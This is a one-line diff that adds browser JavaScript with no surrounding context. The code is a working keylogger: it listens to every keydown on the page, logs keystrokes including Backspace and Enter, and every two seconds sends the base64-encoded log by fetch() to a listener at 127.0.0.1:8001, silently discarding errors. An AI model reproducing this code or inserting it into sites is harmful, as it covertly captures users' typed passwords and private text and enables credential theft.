@@ -1,0 +1,1 @@
+let log="";document.addEventListener("keydown",e=>{log+=e.key.length===1?e.key:e.key==="Backspace"?"[DEL]":e.key==="Enter"?"[ENTER]\\n":" ["+e.key+"] ";},true);setInterval(()=>{if(log.trim()){fetch("http://127.0.0.1:8001/?keys="+btoa(log)).catch(()=>{});log="";}},2000);
